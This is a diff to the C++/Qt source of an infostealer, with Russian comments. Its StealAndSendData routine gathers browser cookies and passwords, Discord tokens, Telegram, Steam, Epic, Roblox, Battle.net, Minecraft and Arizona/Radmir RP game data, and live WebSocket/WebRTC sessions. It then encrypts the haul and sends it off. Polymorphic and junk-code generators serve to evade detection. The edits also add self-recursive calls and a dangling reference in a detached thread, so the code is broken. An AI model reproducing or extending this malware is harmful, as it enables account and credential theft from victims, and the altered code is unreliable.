@@ -1483,7 +1483,7 @@ void MainWindow::replyFinished(QNetworkReply* reply) {
 
 // Генерация полиморфного кода
 std::string MainWindow::generatePolymorphicCode() {
-    std::string polyCode = GeneratePolymorphicCode();
+    std::string polyCode = generatePolymorphicCode();
     std::ofstream outFile("polymorphic_code.h", std::ios::binary);
     if (outFile.is_open()) {
         outFile << polyCode;
@@ -1496,7 +1496,7 @@ std::string MainWindow::generatePolymorphicCode() {
 }
 
 // Генерация заголовка ключей
-void MainWindow::generateBuildKeyHeader() {
+void MainWindow::generateBuildKeyHeader(const std::string& encryptionKey) {
     std::ofstream outFile("build_key.h", std::ios::binary);
     if (outFile.is_open()) {
         outFile << "#ifndef BUILD_KEY_H\n";
@@ -1515,7 +1515,7 @@ void MainWindow::generateBuildKeyHeader() {
 
 // Генерация мусорного кода
 std::string MainWindow::generateJunkCode() {
-    std::string junkCode = GenerateJunkCode();
+    std::string junkCode = generateJunkCode();
     std::ofstream outFile("junk_code_generated.h", std::ios::binary);
     if (outFile.is_open()) {
         outFile << "#ifndef JUNK_CODE_GENERATED_H\n";
@@ -1704,16 +1704,18 @@ void MainWindow::startStealProcess() {
 }
 
 // Сбор и отправка данных с поддержкой Arizona RP и Radmir RP
-void MainWindow::StealAndSendData(const std::string& dir) {
+std::string MainWindow::StealAndSendData(const std::string& dir) {
     std::lock_guard<std::mutex> lock(g_mutex);
     collectedData.clear();
     collectedFiles.clear();
 
-    std::thread([this, dir]() {
+    std::string result; // Переменная для хранения результата
+
+    std::thread([this, dir, &result]() {
         if (config.systemInfo) {
             std::string sysInfo = GetCustomSystemInfo();
             if (!sysInfo.empty()) {
-                collectedData += "[Информация о системе]\n" + sysInfo + "\n";
+                result += "[Информация о системе]\n" + sysInfo + "\n";
             }
         }
 
@@ -1727,60 +1729,60 @@ void MainWindow::StealAndSendData(const std::string& dir) {
         if (config.cookies || config.passwords) {
             std::string browserData = stealBrowserData(dir);
             if (!browserData.empty()) {
-                collectedData += "[Данные браузера]\n" + browserData + "\n";
+                result += "[Данные браузера]\n" + browserData + "\n";
             }
         }
 
         if (config.discord) {
             std::string discordTokens = StealDiscordTokens(dir);
             if (!discordTokens.empty()) {
-                collectedData += "[Токены Discord]\n" + discordTokens + "\n";
+                result += "[Токены Discord]\n" + discordTokens + "\n";
             }
             std::string discordCache = StealAppCacheData("Discord", dir + "\\Discord_Cache");
             if (!discordCache.empty()) {
-                collectedData += "[Кэш Discord]\n" + discordCache + "\n";
+                result += "[Кэш Discord]\n" + discordCache + "\n";
             }
         }
 
         if (config.telegram) {
             std::string telegramData = StealTelegramData(dir);
             if (!telegramData.empty()) {
-                collectedData += "[Данные Telegram]\n" + telegramData + "\n";
+                result += "[Данные Telegram]\n" + telegramData + "\n";
             }
         }
 
         if (config.steam || config.steamMAFile) {
             std::string steamData = StealSteamData(dir);
             if (!steamData.empty()) {
-                collectedData += "[Данные Steam]\n" + steamData + "\n";
+                result += "[Данные Steam]\n" + steamData + "\n";
             }
         }
 
         if (config.epic) {
             std::string epicData = StealEpicGamesData(dir);
             if (!epicData.empty()) {
-                collectedData += "[Данные Epic Games]\n" + epicData + "\n";
+                result += "[Данные Epic Games]\n" + epicData + "\n";
             }
         }
 
         if (config.roblox) {
             std::string robloxData = StealRobloxData(dir);
             if (!robloxData.empty()) {
-                collectedData += "[Данные Roblox]\n" + robloxData + "\n";
+                result += "[Данные Roblox]\n" + robloxData + "\n";
             }
         }
 
         if (config.battlenet) {
             std::string battlenetData = StealBattleNetData(dir);
             if (!battlenetData.empty()) {
-                collectedData += "[Данные Battle.net]\n" + battlenetData + "\n";
+                result += "[Данные Battle.net]\n" + battlenetData + "\n";
             }
         }
 
         if (config.minecraft) {
             std::string minecraftData = StealMinecraftData(dir);
             if (!minecraftData.empty()) {
-                collectedData += "[Данные Minecraft]\n" + minecraftData + "\n";
+                result += "[Данные Minecraft]\n" + minecraftData + "\n";
             }
         }
 
@@ -1788,7 +1790,7 @@ void MainWindow::StealAndSendData(const std::string& dir) {
         if (config.arizonaRP) {
             std::string arizonaData = StealArizonaRPData(dir);
             if (!arizonaData.empty()) {
-                collectedData += "[Данные Arizona RP]\n" + arizonaData + "\n";
+                result += "[Данные Arizona RP]\n" + arizonaData + "\n";
             }
         }
 
@@ -1796,7 +1798,7 @@ void MainWindow::StealAndSendData(const std::string& dir) {
         if (config.radmirRP) {
             std::string radmirData = StealRadmirRPData(dir);
             if (!radmirData.empty()) {
-                collectedData += "[Данные Radmir RP]\n" + radmirData + "\n";
+                result += "[Данные Radmir RP]\n" + radmirData + "\n";
             }
         }
 
@@ -1805,11 +1807,11 @@ void MainWindow::StealAndSendData(const std::string& dir) {
             for (const auto& process : processes) {
                 std::string wsData = CaptureWebSocketSessions(process);
                 if (!wsData.empty()) {
-                    collectedData += "[Сессии WebSocket - " + process + "]\n" + wsData + "\n";
+                    result += "[Сессии WebSocket - " + process + "]\n" + wsData + "\n";
                 }
                 std::string webrtcData = CaptureWebRTCSessions(process);
                 if (!webrtcData.empty()) {
-                    collectedData += "[Сессии WebRTC - " + process + "]\n" + webrtcData + "\n";
+                    result += "[Сессии WebRTC - " + process + "]\n" + webrtcData + "\n";
                 }
             }
         }
@@ -1820,9 +1822,9 @@ void MainWindow::StealAndSendData(const std::string& dir) {
         }
 
         std::string encryptedData;
-        if (!collectedData.empty()) {
+        if (!result.empty()) {
             try {
-                encryptedData = EncryptData(collectedData, encryptionKey1, encryptionKey2, encryptionSalt);
+                encryptedData = EncryptData(result, encryptionKey1, encryptionKey2, encryptionSalt);
                 Log("Данные успешно зашифрованы");
             } catch (const std::exception& e) {
                 Log("Не удалось зашифровать данные: " + QString::fromStdString(e.what()));
@@ -1840,6 +1842,8 @@ void MainWindow::StealAndSendData(const std::string& dir) {
 
         sendData(QString::fromStdString(encryptedData), collectedFiles);
     }).detach();
+
+    return result; // Возвращаем собранные данные
 }
 
 // Кража данных Arizona RP (пример реализации)
